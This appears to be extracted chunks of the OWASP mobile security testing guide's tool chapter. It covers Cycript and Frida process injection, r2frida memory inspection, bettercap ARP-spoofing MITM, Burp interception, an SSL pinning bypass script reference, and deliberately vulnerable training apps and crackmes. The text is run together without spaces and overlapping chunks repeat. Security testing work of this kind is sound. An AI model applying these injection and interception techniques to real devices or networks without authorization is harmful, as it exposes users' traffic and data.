TospawntheinteractiveCycriptshell,run“./cycript”or“cycript”ifCycriptisonyourpath. $cycript cy# Toinjectintoarunningprocess,wefirstneedtofindtheprocessID(PID).Runtheapplicationandmakesuretheappisin theforeground. Runningcycript -p <PID>injectsCycriptintotheprocess. Toillustrate,wewillinjectintoSpringBoard (whichisalwaysrunning). $ps -ef|grep SpringBoard 50178100:00.00 ??0:10.57/System/Library/CoreServices/SpringBoard.app/SpringBoard $./cycript -p78 cy# Oneofthefirstthingsyoucantryoutistogettheapplicationinstance(UIApplication),youcanuseObjective-Csyn- tax: cy#[UIApplicationsharedApplication] cy#vara=[UIApplicationsharedApplication] Usethatvariablenowtogettheapplication’sdelegateclass: cy#a.delegate Let’strytotriggeranalertmessageonSpringBoardwithCycript. cy#alertView=[[UIAlertViewalloc]initWithTitle:@\"OWASPMASTG\" message:@\"MobileApplicationSecurityTestingGuide\" delegate:nilcancelButtonitle:@\"OK\" ↪ otherButtonTitles:nil] ##\"<UIAlertView:0x1645c550;frame=(00;00);layer=<CALayer:0x164df160>>\" cy#[alertViewshow] cy#[alertViewrelease] 556\\nFindtheapp’sdocumentdirectorywithCycript: cy#[[NSFileManagerdefaultManager]URLsForDirectory:NSDocumentDirectoryinDomains:NSUserDomainMask][0] ##\"file:///var/mobile/Containers/Data/Application/A8AE15EE-DC8B-4F1C-91A5-1FED35212DF/Documents/\" Thecommand[[UIAppkeyWindow]recursiveDescription].toString()returnstheviewhierarchyofkeyWindow. The description of every subview and sub-subview ofkeyWindow is shown. The indentation space reflects the relationships betweenviews. Forexample,UILabel,UITextField,andUIButtonaresubviewsofUIView. cy#[[UIAppkeyWindow]recursiveDescription].toString() `<UIWindow: 0x16e82190;frame =(00;320568); gestureRecognizers =<NSArray: 0x16e80ac0>; layer =<UIWindowLayer: 0x16e63ce0>> |<UIView: 0x16e935f0; frame =(00;320568); autoresize =W+H; layer =<CALayer: 0x16e93680>> | |<UILabel:0x16e8f840;frame=(040;8220.5);text='iamgroot!';hidden=YES;opaque=NO;autoresize=RM+BM;userInteractionEnabled=NO;layer= ↪ <_UILabelLayer: 0x16e8f920>> | |<UILabel: 0x16e8e030; frame =(0110.5; 32020.5); text ='ASecretIsFoundInThe...';opaque =NO;autoresize =RM+BM; userInteractionEnabled =NO; ↪ layer =<_UILabelLayer: 0x16e8e290>> | |<UITextField: 0x16e8fbd0; frame =(8141; 30430); text ='';clipsToBounds =YES; opaque =NO;autoresize =RM+BM; gestureRecognizers =<NSArray: ↪ 0x16e94550>; layer =<CALayer: 0x16e8fea0>> | | |<_UITextFieldRoundedRectBackgroundViewNeue: 0x16e92770; frame = (00;30430); opaque =NO;autoresize =W+H; userInteractionEnabled =NO;layer = ↪ <CALayer: 0x16e92990>> | |<UIButton: 0x16d901e0; frame =(8191; 30430); opaque =NO;autoresize =RM+BM; layer =<CALayer: 0x16d90490>> | | |<UIButtonLabel:0x16e72b70;frame=(1336;3818);text='Verify';opaque=NO;userInteractionEnabled=NO;layer=<_UILabelLayer:0x16e974b0>> | |<_UILayoutGuide: 0x16d92a00; frame =(00;020); hidden =YES; layer =<CALayer: 0x16e936b0>> | |<_UILayoutGuide: 0x16d92c10; frame =(0568; 00);hidden =YES; layer =<CALayer: 0x16d92cb0>>` YoucanalsouseCycript’sbuilt-infunctionssuchaschoosewhichsearchestheheapforinstancesofthegivenObjective-C class: 557\\ncy#choose(SBIconModel) [#\"<SBIconModel:0x1590c8430>\"] LearnmoreintheCycriptManual. xcrun Platform: ios Availableat: http://www.manpagez.com/man/1/xcrun/ xcruncanbeusedinvokeXcodedevelopertoolsfromthecommand-line,withouthavingtheminthepath. Forexample youmaywanttouseittolocateandrunswift-demangleorsimctl. optool Platform: ios Availableat: https://github.com/alexzielenski/optool optool is a tool which interfaces with MachO binaries in order to insert/remove load commands, strip code signatures, resign,andremoveaslr. Toinstallit: gitclonehttps://github.com/alexzielenski/optool.git cdoptool/ gitsubmoduleupdate --init --recursive xcodebuild ln-s<your-path-to-optool>/build/Release/optool/usr/local/bin/optool Thelastlinecreatesasymboliclinkandmakestheexecutableavailablesystem-wide. Reloadyourshelltomakethenew commandsavailable: zsh: #.~/.zshrc bash: #.~/.bashrc dsdump Platform: ios Availableat: https://github.com/DerekSelander/dsdump dsdumpisatooltodumpObjective-CclassesandSwifttypedescriptors(classes,structs,enums). ItonlysupportsSwift version5orhigheranddoesnotsupportARM32-bitbinaries. ThefollowingexampleshowshowyoucandumpObjective-CclassesandSwifttypedescriptorsofaniOSapplication. Firstverifyiftheapp’smainbinaryisaFATbinarycontainingARM64: $otool -hv[APP_MAIN_BINARY_FILE] Machheader magiccputypecpusubtype caps filetypencmdssizeofcmds flags MH_MAGIC ARM V7 0x00 EXECUTE 39 5016 NOUNDEFSDYLDLINKTWOLEVELPIE Machheader magiccputypecpusubtype caps filetypencmdssizeofcmds flags MH_MAGIC_64 ARM64 ALL 0x00 EXECUTE 38 5728 NOUNDEFSDYLDLINKTWOLEVELPIE Ifyes,thenwespecifythe“–arch”parameterto“arm64”,otherwiseitisnotneededifthebinaryonlycontainsanARM64 binary. 558\\n##DumptheObjective-Cclassestoatemporaryfile $dsdump --objc --color --verbose=5--arch arm64 --defined [APP_MAIN_BINARY_FILE]>/tmp/OBJC.txt ##DumptheSwifttypedescriptorstoatemporaryfileiftheappisimplementedinSwift $dsdump --swift --color --verbose=5--arch arm64 --defined [APP_MAIN_BINARY_FILE]>/tmp/SWIFT.txt YoucanfindmoreinformationabouttheinnerworkingsofdsdumpandhowtoprogrammaticallyinspectaMach-Obinary todisplaythecompiledSwifttypesandObjective-Cclassesinthisarticle. bettercap Platform: network Availableat: https://github.com/bettercap/bettercap Apowerfulframeworkwhichaimstooffertosecurityresearchersandreverseengineersaneasytouse,all-in-onesolution for Wi-Fi, Bluetooth Low Energy, wireless HID hijacking and Ethernet networks reconnaissance. It can be used during network penetration tests in order to simulate a man-in-the-middle (MITM) attack. This is achieved by executing ARP poisoningorspoofingtothetargetcomputers. Whensuchanattackissuccessful, allpacketsbetweentwocomputers areredirectedtoathirdcomputerthatactsastheman-in-the-middleandisabletointerceptthetrafficforanalysis. bettercapisapowerfultooltoexecuteMITMattacksandshouldbepreferrednowadays,insteadofettercap. See alsoWhyanotherMITMtool? onthebettercapsite. bettercap is available for all major Linux and Unix operating systems and should be part of their respective package installation mechanisms. You need to install it on your host computer that will act as the MITM. On macOS it can be installedbyusingbrew. brewinstallbettercap ForKaliLinuxyoucaninstallbettercapwithapt-get: apt-getupdate apt-getinstallbettercap ThereareinstallationinstructionsaswellforUbuntuLinux18.04onLinuxHint. Burp Suite Platform: network Availableat: https://portswigger.net/burp/communitydownload BurpSuiteisanintegratedplatformforperformingsecuritytestingmobileandwebapplications. Its tools work together seamlessly to support the entire testing process, from initial mapping and analysis",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 175
    }
  },
  {
    "text": "mechanisms. You need to install it on your host computer that will act as the MITM. On macOS it can be installedbyusingbrew. brewinstallbettercap ForKaliLinuxyoucaninstallbettercapwithapt-get: apt-getupdate apt-getinstallbettercap ThereareinstallationinstructionsaswellforUbuntuLinux18.04onLinuxHint. Burp Suite Platform: network Availableat: https://portswigger.net/burp/communitydownload BurpSuiteisanintegratedplatformforperformingsecuritytestingmobileandwebapplications. Its tools work together seamlessly to support the entire testing process, from initial mapping and analysis of attack surfaces to finding and exploiting security vulnerabilities. Burp Proxy operates as a web proxy server for Burp Suite, which is positioned as a man-in-the-middle between the browser and web servers. Burp Suite allows you to intercept, inspect,andmodifyincomingandoutgoingrawHTTPtraffic. SettingupBurptoproxyyourtrafficisprettystraightforward. Weassumethatbothyourdeviceandhostcomputerare connectedtoaWi-Finetworkthatpermitsclient-to-clienttraffic. PortSwiggerprovidesgoodtutorialsonsettingupbothAndroidasiOSdevicestoworkwithBurp: • ConfiguringanAndroidDevicetoWorkWithBurp. • InstallingBurp’sCAcertificatetoanAndroiddevice. • ConfiguringaniOSDevicetoWorkWithBurp. • InstallingBurp’sCAcertificatetoaniOSdevice. Pleaserefertothesection“SettingupanInterceptionProxy”intheAndroidandiOS“BasicSecurityTesting”chaptersfor moreinformation. 559\\nWireshark Platform: network Availableat: https://github.com/wireshark/wireshark Anopen-sourcepacketanalyzer-https://www.wireshark.org/download.html OWASP ZAP Platform: network Availableat: https://github.com/zaproxy/zaproxy OWASP ZAP (Zed Attack Proxy) is a free security tool which helps to automatically find security vulnerabilities in web applicationsandwebservices. tcpdump Platform: network Acommandlinepacketcaptureutility-https://www.tcpdump.org/ MITM Relay Platform: network Availableat: https://github.com/jrmdev/mitm_relay Ascripttointerceptandmodifynon-HTTPprotocolsthroughBurpandotherswithsupportforSSLandSTARTTLSintercep- tion-https://github.com/jrmdev/mitm_relay Android tcpdump Platform: network Availableat: https://www.androidtcpdump.com AcommandlinepacketcaptureutilityforAndroid. r2frida Platform: generic Availableat: https://github.com/nowsecure/r2frida r2fridaisaprojectthatallowsradare2toconnecttoFrida,effectivelymergingthepowerfulreverseengineeringcapabilities ofradare2withthedynamicinstrumentationtoolkitofFrida. r2fridacanbeusedinbothonAndroidandiOS,allowingyou to: • Attachradare2toanylocalprocessorremotefrida-serverviaUSBorTCP. • Read/Writememoryfromthetargetprocess. • LoadFridainformationsuchasmaps,symbols,imports,classesandmethodsintoradare2. • Callr2commandsfromFridaasitexposesther2pipeinterfaceintotheFridaJavascriptAPI. 560\\nPleaserefertor2frida’sofficialinstallationinstructions. Withfrida-serverrunning,youshouldnowbeabletoattachtoitusingthepid,spawnpath,hostandport,ordevice-id. Forexample,toattachtoPID1234: r2frida://1234 Formoreexamplesonhowtoconnecttofrida-server,seetheusagesectioninther2frida’sREADMEpage. ThefollowingexampleswereexecutedusinganAndroidappbutalsoapplytoiOSapps. Onceinther2fridasession,allcommandsstartwith: or=!. Forexample,inradare2you’drunitodisplaythebinary information,butinr2fridayou’duse:i. Seealloptionswithr2 frida://?. [0x00000000]>:i arch x86 bits 64 os linux pid 2218 uid 1000 objc false runtime V8 java false cylang false pageSize 4096 pointerSize 8 codeSigningPolicy optional isDebuggerAttached false Tosearchinmemoryforaspecifickeyword,youmayusethesearchcommand\\/: [0x00000000]>\\/unacceptable Searching12bytes:756e61636365707461626c65 Searching12bytesin [0x0000561f05ebf000-0x0000561f05eca000] ... Searching12bytesin [0xffffffffff600000-0xffffffffff601000] hits:23 0x561f072d89eehit12_0unacceptablepolicyunsupportedmdalgorithmvarbadvaluec 0x561f0732a91ahit12_1unacceptableSearching12bytes:756e61636365707461 To output the search results in JSON format, we simply addj to our previous search command (just as we do in the r2 shell). Thiscanbeusedinmostofthecommands: [0x00000000]>\\/junacceptable Searching12bytes:756e61636365707461626c65 Searching12bytesin [0x0000561f05ebf000-0x0000561f05eca000] ... Searching12bytesin [0xffffffffff600000-0xffffffffff601000] hits:23 {\"address\":\"0x561f072c4223\",\"size\":12,\"flag\":\"hit14_1\",\"content\":\"unacceptable \\ policyunsupportedmdalgorithmvarbadvaluec0\"},{\"address\":\"0x561f072c4275\", \\ \"size\":12,\"flag\":\"hit14_2\",\"content\":\"unacceptableSearching12bytes:756e61 \\ 636365707461\"},{\"address\":\"0x561f072c42c8\",\"size\":12,\"flag\":\"hit14_3\",\\ \"content\":\"unacceptableSearching12bytes:756e61636365707461\"}, ... To list the loaded libraries use the command :il and filter the results using the internal grep from radare2 with the command~. Forexample,thefollowingcommandwilllisttheloadedlibrariesmatchingthekeywordskeystore,ssland crypto: [0x00000000]>:il~keystore,ssl,crypto 0x00007f3357b8e000libssl.so.1.1 0x00007f3357716000libcrypto.so.1.1 Similarly,tolisttheexportsandfiltertheresultsbyaspecifickeyword: 561\\n[0x00000000]>:iElibssl.so.1.1~CIPHER 0x7f3357bb7ef0fSSL_CIPHER_get_bits 0x7f3357bb8260fSSL_CIPHER_find 0x7f3357bb82c0fSSL_CIPHER_get_digest_nid 0x7f3357bb8380fSSL_CIPHER_is_aead 0x7f3357bb8270fSSL_CIPHER_get_cipher_nid 0x7f3357bb7ed0fSSL_CIPHER_get_name 0x7f3357bb8340fSSL_CIPHER_get_auth_nid 0x7f3357bb7930fSSL_CIPHER_description 0x7f3357bb8300fSSL_CIPHER_get_kx_nid 0x7f3357bb7ea0fSSL_CIPHER_get_version 0x7f3357bb7f10fSSL_CIPHER_get_id Tolistorsetabreakpointusethecommanddb. Thisisusefulwhenanalyzing/modifyingmemory: [0x00000000]>:db Finally,rememberthatyoucanalsorunFridaJavaScriptcodewith\\. plusthenameofthescript: [0x00000000]>\\.agent.js Youcanfindmoreexamplesonhowtouser2fridaontheirWikiproject. Frida Platform: generic Availableat: https://github.com/frida/frida FridaisafreeandopensourcedynamiccodeinstrumentationtoolkitwrittenbyOleAndréVadlaRavnåsthatworksby injectingtheQuickJSJavaScriptengine(previouslyDuktapeandV8)intotheinstrumentedprocess. Fridaletsyouexecute snippetsofJavaScriptintonativeappsonAndroidandiOS(aswellasonotherplatforms). ToinstallFridalocally,simplyrun: pipinstallfrida-tools Orrefertotheinstallationpageformoredetails. Codecanbeinjectedinseveralways. Forexample,XposedpermanentlymodifiestheAndroidapploader,providinghooks forrunningyourowncodeeverytimeanewprocessisstarted. Incontrast,Fridaimplementscodeinjectionbywriting codedirectlyintotheprocessmemory. Whenattachedtoarunningapp: • Fridausesptracetohijackathreadofarunningprocess. Thisthreadisusedtoallocateachunkofmemoryand populateitwithamini-bootstrapper. • Thebootstrapperstartsafreshthread, connectstotheFridadebuggingserverthat’srunningonthedevice, and loadsasharedlibrarythatcontainstheFridaagent(frida-agent.so). • Theagentestablishesabi-directionalcommunicationchannelbacktothetool(e.g.theFridaREPLoryourcustom Pythonscript). • Thehijackedthreadresumesafterbeingrestoredtoitsoriginalstate,andprocessexecutioncontinuesasusual. 562\\n• FridaArchitecture,source: https://www.frida.re/docs/hacking/ Fridaoffersthreemodesofoperation: 1. Injected: thisisthemostcommonscenariowhenfrida-serverisrunningasadaemonintheiOSorAndroiddevice. frida-core is exposed over TCP, listening on localhost:27042 by default. Running in this mode is not possible on devicesthatarenotrootedorjailbroken. 2. Embedded: thisisthecasewhenyourdeviceisnotrootednorjailbroken(youcannotuseptraceasanunprivileged user),you’reresponsiblefortheinjectionofthefrida-gadgetlibrarybyembeddingitintoyourapp,manuallyorvia third-partytoolssuchasObjection. 3. Preloaded: similar to LD_PRELOAD or DYLD_INSERT_LIBRARIES. You can configure the frida-gadget to run autonomouslyandloadascriptfromthefilesystem(e.g.pathrelativetowheretheGadgetbinaryresides). Independently of the chosen mode, you can make use of the Frida JavaScript APIs to interact with the running process anditsmemory. SomeofthefundamentalAPIsare: • Interceptor: WhenusingtheInterceptorAPI,Fridainjectsatrampoline(akain-linehooking)atthefunctionprologue whichprovokesaredirectiontoourcustomcode,executesourcode,andreturnstotheoriginalfunction. Notethat whileveryeffectiveforourpurpose,thisintroducesaconsiderableoverhead(duetothetrampolinerelatedjumping andcontextswitching)andcannotbeconsideredtransparentasitoverwritestheoriginalcodeandactssimilarto a debugger (putting breakpoints) and therefore can be detected in a similar manner, e.g. by applications that periodicallychecksumtheirowncode. • Stalker: If your tracing requirements include transparency, performance and high granularity, Stalker should be yourAPIofchoice. WhentracingcodewiththeStalkerAPI,Fridaleveragesjust-in-timedynamicrecompilation(by usingCapstone): whenathreadisabouttoexecuteitsnextinstructions,Stalkerallocatessomememory,copies the original code over, and interlaces the copy with your custom code for instrumentation. Finally, it executes thecopy(leavingtheoriginalcodeuntouched,andthereforeavoidinganyanti-debuggingchecks). Thisapproach 563\\nincreases instrumentation performance considerably and allows for very high granularity when tracing (e.g. by tracingexclusivelyCALLorRETinstructions). Youcanlearnmorein-depthdetailsintheblogpost“Anatomyofa codetracer”byFrida’screatorOle[#vadla]. SomeexamplesofuseforStalkerare,forexamplewho-does-it-callor diff-calls. • Java: WhenworkingonAndroidyoucanusethisAPItoenumerateloadedclasses,enumerateclassloaders,create andusespecificclassinstances,enumerateliveinstancesofclassesbyscanningtheheap,etc. • ObjC:WhenworkingoniOSyoucanusethisAPItogetamappingofallregisteredclasses,registerorusespecific classorprotocolinstances,enumerateliveinstancesofclassesbyscanningtheheap,etc. Frida",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 176
    }
  },
  {
    "text": "yourAPIofchoice. WhentracingcodewiththeStalkerAPI,Fridaleveragesjust-in-timedynamicrecompilation(by usingCapstone): whenathreadisabouttoexecuteitsnextinstructions,Stalkerallocatessomememory,copies the original code over, and interlaces the copy with your custom code for instrumentation. Finally, it executes thecopy(leavingtheoriginalcodeuntouched,andthereforeavoidinganyanti-debuggingchecks). Thisapproach 563\\nincreases instrumentation performance considerably and allows for very high granularity when tracing (e.g. by tracingexclusivelyCALLorRETinstructions). Youcanlearnmorein-depthdetailsintheblogpost“Anatomyofa codetracer”byFrida’screatorOle[#vadla]. SomeexamplesofuseforStalkerare,forexamplewho-does-it-callor diff-calls. • Java: WhenworkingonAndroidyoucanusethisAPItoenumerateloadedclasses,enumerateclassloaders,create andusespecificclassinstances,enumerateliveinstancesofclassesbyscanningtheheap,etc. • ObjC:WhenworkingoniOSyoucanusethisAPItogetamappingofallregisteredclasses,registerorusespecific classorprotocolinstances,enumerateliveinstancesofclassesbyscanningtheheap,etc. Frida also provides a couple of simple tools built on top of the Frida API and available right from your terminal after installingfrida-toolsviapip. Forinstance: • YoucanusetheFridaCLI(frida)forquickscriptprototypingandtry/errorscenarios. • frida-pstoobtainalistofallapps(orprocesses)runningonthedeviceincludingtheirnames,identifiersandPIDs. • frida-ls-devicestolistyourconnecteddevicesrunningFridaserversoragents. • frida-tracetoquicklytracemethodsthatarepartofaniOSapporthatareimplementedinsideanAndroidnative library. Inaddition,you’llalsofindseveralopensourceFrida-basedtools,suchas: • Grapefruit: aRuntimeApplicationInstrumenttoolkigforiOS. • Fridump: amemorydumpingtoolforbothAndroidandiOS. • Objection: aruntimemobilesecurityassessmentframework. • r2frida: aprojectmergingthepowerfulreverseengineeringcapabilitiesofradare2withthedynamicinstrumenta- tiontoolkitofFrida. • jnitrace: atoolfortracingusageoftheAndroidJNIruntimemethodsbyanativelibrary. Wewillbeusingallofthesetoolsthroughouttheguide. Youcanusethesetoolsas-is,tweakthemtoyourneeds,ortakeasexcellentexamplesonhowtousetheAPIs. Having them as an example is very helpful when you write your own hooking scripts or when you build introspection tools to supportyourreverseengineeringworkflow. Frida CodeShare Platform: generic Availableat: https://codeshare.frida.re/ Frida CodeShare is a repository containing a collection of ready-to-run Frida scripts which can enormously help when performingconcretetasksbothonAndroidasoniOSaswellasalsoserveasinspirationtobuildyourownscripts. Two representativeexamplesare: • Universal Android SSL Pinning Bypass with Frida - https://codeshare.frida.re/@pcipolloni/universal-android-ssl- pinning-bypass-with-frida/ • ObjCmethodobserver-https://codeshare.frida.re/@mrmacete/objc-method-observer/ Usingthemisassimpleasincludingthe--codeshare<handler>flagandahandlerwhenusingtheFridaCLI.Forexample, touse“ObjCmethodobserver”,enterthefollowing: frida --codeshare mrmacete/objc-method-observer -fYOUR_BINARY LIEF Platform: generic Availableat: https://github.com/lief-project/LIEF ThepurposeofLIEFistoprovideacrossplatformlibrarytoparse,modifyandabstractELF,PEandMachOformats. With ityoucan,forinstance,injectacertainlibraryasadependencyofanativelibrary,whichanapplicationalreadyloadsby default. -https://lief.quarkslab.com/ 564\\nGhidra Platform: generic Availableat: https://github.com/NationalSecurityAgency/ghidra Ghidraisanopensourcesoftwarereverseengineering(SRE)suiteoftoolsdevelopedbytheUnitedStateofAmerica’s National Security Agency’s (NSA) Research Directorate. Ghidra is a versatile tool which comprises of a disassembler, decompilerandabuilt-inscriptingengineforadvancedusage. Pleaserefertotheinstallationguideonhowtoinstallit andalsolookatthecheatsheetforafirstoverviewofavailablecommandsandshortcuts. Inthissection,wewillhave walk-throughonhowtocreateaproject,viewdisassemblyanddecompiledcodeforabinary. StartGhidrausingghidraRun(*nix)orghidraRun.bat(Windows),dependingontheplatformyouareon. OnceGhidrais firedup,createanewprojectbyspecifyingtheprojectdirectory. Youwillbegreetedbyawindowasshownbelow: In your new Active Project you can import an app binary by going to File -> Import File and choosing the desired file. 565\\nIfthefilecanbeproperlyprocessed,Ghidrawillshowmeta-informationaboutthebinarybeforestartingtheanalysis. To get the disassembled code for the binary file chosen above, double click the imported file from the Active Project 566\\nwindow. Clickyesandanalyzeforauto-analysisonthesubsequentwindows. Auto-analysiswilltakesometimedepend- ingonthesizeofthebinary,theprogresscanbetrackedinthebottomrightcornerofthecodebrowserwindow. Once auto-analysisiscompletedyoucanstartexploringthebinary. The most important windows to explore a binary in Ghidra are the Listing (Disassembly) window, the Symbol Tree windowandtheDecompilerwindow,whichshowsthedecompiledversionofthefunctionselectedfordisassembly. The DisplayFunctionGraphoptionshowscontrolflowgraphoftheselectedfunction. 567\\nTherearemanyotherfunctionalitiesavailableinGhidraandmostofthemcanbeexploredbyopeningtheWindowmenu. Forexample,ifyouwanttoexaminethestringspresentinthebinary,opentheDefinedStringsoption. Wewilldiscuss otheradvancedfunctionalitieswhileanalyzingvariousbinariesforAndroidandiOSplatformsinthecomingchapters. 568\\nRMS Runtime Mobile Security Platform: generic Availableat: https://github.com/m0bilesecurity/RMS-Runtime-Mobile-Security RMS-RuntimeMobileSecurityisaruntimemobileapplicationanalysistoolkit,supportingAndroidandiOSApps. Itoffers awebGUIandiswritteninPython. It’sleveragingarunningFridaserveronajailbrokendevicewiththefollowingout-of-boxfunctionalities: • ExecutepopularFridascripts • ExecutecustomFridascripts • Dumpalltheloadedclassesandrelativemethods • Hookmethodsonthefly • (Android)MonitorAndroidAPIsandusageofnativeAPIs Theinstallationinstructionsand“how-toguide”ofRMScanbefoundintheReadmeoftheGithubrepo. iaito Platform: generic Availableat: https://github.com/radareorg/iaito Iaitoistheofficialgraphicaluserinterfaceforradare2,anopen-sourcereverseengineeringframework. Thisuser-friendly toolsimplifiesthereverseengineeringprocessbyprovidingagraphicalinterfacethatintegratesseamlesslywithradare2’s powerfulfeatures. Withafocusonsimplicity,keybindings,andradare2-styleworkflows,Iaitoisavaluableresourcefor bothexperiencedreverseengineersandthosenewtothefield,offeringamoreaccessibleandefficientwaytoworkwith radare2. 569\\nMobSF Platform: generic Availableat: https://github.com/MobSF/Mobile-Security-Framework-MobSF MobSF(MobileSecurityFramework)isanautomated,all-in-onemobileapplicationpentestingframeworkcapableofper- formingstaticanddynamicanalysis. TheeasiestwayofgettingMobSFstartedisviaDocker. dockerpullopensecurity/mobile-security-framework-mobsf dockerrun -it-p8000:8000opensecurity/mobile-security-framework-mobsf:latest Orinstallandstartitlocallyonyourhostcomputerbyrunning: ##Setup gitclonehttps://github.com/MobSF/Mobile-Security-Framework-MobSF.git cdMobile-Security-Framework-MobSF ./setup.sh #ForLinuxandMac setup.bat #ForWindows ##Installationprocess ./run.sh #ForLinuxandMac run.bat #ForWindows OnceyouhaveMobSFupandrunningyoucanopenitinyourbrowserbynavigatingtohttp://127.0.0.1:8000. Simply dragtheAPKyouwanttoanalyzeintotheuploadareaandMobSFwillstartitsjob. objection Platform: generic Availableat: https://github.com/sensepost/objection Objection is a “runtime mobile exploration toolkit, powered by Frida”. Its main goal is to allow security testing on non- rooteddevicesthroughanintuitiveinterface. ObjectionachievesthisgoalbyprovidingyouwiththetoolstoeasilyinjecttheFridagadgetintoanapplicationbyrepack- agingit. Thisway,youcandeploytherepackagedapptothenon-rooted/non-jailbrokendevicebysideloadingit. Objection alsoprovidesaREPLthatallowsyoutointeractwiththeapplication,givingyoutheabilitytoperformanyactionthatthe applicationcanperform. ObjectioncanbeinstalledthroughpipasdescribedonObjection’sWiki. pip3installobjection 570\\nReference applications Theapplicationslistedbelowcanbeusedastrainingmaterials. Note: onlytheMASTGappsandCrackmesaretestedand maintainedbytheMASproject. OVAA Platform: android Availableat: https://github.com/oversecured/ovaa AnAndroidappthataggregatesalltheplatform’sknownandpopularsecurityvulnerabilities. InsecureShop Platform: android Availableat: https://github.com/hax0rgb/InsecureShop/ InsecureShopisanintentionallydesignedAndroidapplicationthatshowcasesvulnerabilities,aimingtoeducatedevelop- ersandsecurityexpertsaboutcommonpitfallswithinmodernAndroidapps. Itservesasadynamicplatformforrefining Androidpentestingskills. The majority of these vulnerabilities can be exploited on non-rooted devices, posing risks from both remote users and malicious third-party applications. Notably, the app doesn’t utilize any APIs. InsecureShop presents an opportunity to explorearangeofvulnerabilities: • HardcodedCredentials: Embeddedlogincredentialswithinthecode. • InsufficientURLValidation: AllowsloadingofarbitraryURLsviaDeeplinks. • ArbitraryCodeExecution: Enablestheexecutionofcodefromthird-partypackages. • AccesstoProtectedComponents: Permitsthird-partyappstolaunchsecurecomponents. • InsecureBroadcastReceiver: RegistrationofabroadcastenablingURLinjection. • InsecureContentProvider: Accessiblecontentproviderputtinguserdataatrisk. Complementingtheselearningexperiences,InsecureShopprovidesdocumentationabouttheimplementedvulnerabilities andtheirassociatedcode. Thisdocumentation,however,refrainsfromofferingcompletesolutionsforeachvulnerability showcasedwithintheInsecureShopapp. AndroGoat Platform: android Availableat: https://github.com/satishpatnayak/AndroGoat Anopensourcevulnerable/insecureapp usingKotlin. This apphas awiderange ofvulnerabilities relatedto certificate pinning, custom URL schemes, Android Network Security Configuration, WebViews, root detection and over 20 other vulnerabilities. Android License Validator Platform: android Availableat: https://mas.owasp.org/crackmes/Android#android-license-validator 571\\nThe Android License Validator is a",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 177
    }
  },
  {
    "text": "RegistrationofabroadcastenablingURLinjection. • InsecureContentProvider: Accessiblecontentproviderputtinguserdataatrisk. Complementingtheselearningexperiences,InsecureShopprovidesdocumentationabouttheimplementedvulnerabilities andtheirassociatedcode. Thisdocumentation,however,refrainsfromofferingcompletesolutionsforeachvulnerability showcasedwithintheInsecureShopapp. AndroGoat Platform: android Availableat: https://github.com/satishpatnayak/AndroGoat Anopensourcevulnerable/insecureapp usingKotlin. This apphas awiderange ofvulnerabilities relatedto certificate pinning, custom URL schemes, Android Network Security Configuration, WebViews, root detection and over 20 other vulnerabilities. Android License Validator Platform: android Availableat: https://mas.owasp.org/crackmes/Android#android-license-validator 571\\nThe Android License Validator is a crackme that implements a key validation function in native code, packaged as a standaloneELFexecutableforAndroiddevices. AnalyzingnativecodeisoftenmorechallengingthanJava,whichiswhy criticalbusinesslogicisfrequentlywrittenthisway. Whilethissampleapplicationmaynotrepresentareal-worldscenario,itservesasavaluablelearningtooltograspthe basicsofsymbolicexecution. Theseinsightscanbeappliedinpracticalsituations,especiallywhendealingwithAndroid appsthatincludeobfuscatednativelibraries. Infact,obfuscatedcodeisoftenputintonativelibrariesspecificallytomake theprocessofde-obfuscationmorechallenging. ByBernhardMueller InsecureBankv2 Platform: android Availableat: https://github.com/dineshshetty/Android-InsecureBankv2 A vulnerable Android app made for security enthusiasts and developers to learn the Android insecurities by testing a vulnerableapplication. Ithasbeenupdatedin2018andcontainsalotofvulnerabilities. DodoVulnerableBank Platform: android Availableat: https://github.com/CSPF-Founder/DodoVulnerableBank AninsecureAndroidappfrom2015. Android UnCrackable L3 Platform: android Availableat: https://mas.owasp.org/crackmes/Android#android-uncrackable-l3 Thecrackmefromhell! Asecretstringishiddensomewhereinthisapp. Findawaytoextractit. ByBernhardMueller. SpecialthankstoEduardoNovellafortesting, feedbackandpointingoutflawsintheinitial build(s). Android UnCrackable L1 Platform: android Availableat: https://mas.owasp.org/crackmes/Android#android-uncrackable-l1 Asecretstringishiddensomewhereinthisapp. Findawaytoextractit. ByBernhardMueller MASTG Hacking Playground (Kotlin) Platform: android Availableat: https://github.com/OWASP/MASTG-Hacking-Playground/tree/master/Android/MASTG-Android-Kotlin- App AvulnerableAndroidappbytheOWASPMASproject. 572\\nMASTG Hacking Playground (Java) Platform: android Availableat: https://github.com/OWASP/MASTG-Hacking-Playground/tree/master/Android/MASTG-Android-Java- App AvulnerableAndroidappbytheOWASPMASproject. Seeincludedvulnerabilitiesinhere. Digitalbank Platform: android Availableat: https://github.com/CyberScions/Digitalbank Avulnerableappcreatedin2015,whichcanbeusedonolderAndroidplatforms. DIVA Android Platform: android Availableat: https://github.com/payatu/diva-android Anappintentionallydesignedtobeinsecurewhichhasreceivedupdatesin2016andcontains13differentchallenges. DVHMA Platform: android Availableat: https://github.com/logicalhacking/DVHMA Ahybridmobileapp(forAndroid)thatintentionallycontainsvulnerabilities. Android UnCrackable L4 Platform: android Availableat: https://mas.owasp.org/crackmes/Android#android-uncrackable-l4 The Radare2 community always dreamed with its decentralized and free currency to allow r2 fans to make payments in places and transfer money between r2 users. A debug version of the r2Pay app has been developed and it will be supportedverysooninmanystoresandwebsites. Canyouverifythatthisiscryptographicallyunbreakable? Hint: RuntheAPKinanon-tampereddevicetoplayabitwiththeapp. 1. ThereisamasterPINcodethatgeneratesgreentokens(akar2coins)onthescreen. Ifyouseearedr2coin,then thistokenwon’tbevalidatedbythecommunity. Youneedtofindoutthe4digitsPINcodeandthesaltemployed aswell. Flag: r2con{PIN_NUMERIC:SALT_LOWERCASE} 2. Thereisa“r2paymasterkey”buriedinlayersofobfuscationandprotections. Canyoubreakthewhitebox? Flag: r2con{ascii(key)} Versions: • v0.9-ReleaseforOWASPMAS:Sourcecodeisavailableandthecompilationhasbeensoftenedinmanywaysto makethechallengeeasierandmoreenjoyablefornewcomers. • v1.0-ReleaseforR2conCTF2020: Nosourcecodeisavailableandmanyextraprotectionsareinplace. 573\\nCreated and maintained by Eduardo Novella & Gautam Arvind. Special thanks to NowSecure for supporting this crackme. Android UnCrackable L2 Platform: android Availableat: https://mas.owasp.org/crackmes/Android#android-uncrackable-l2 Thisappholdsasecretinside. Mayincludetracesofnativecode. By 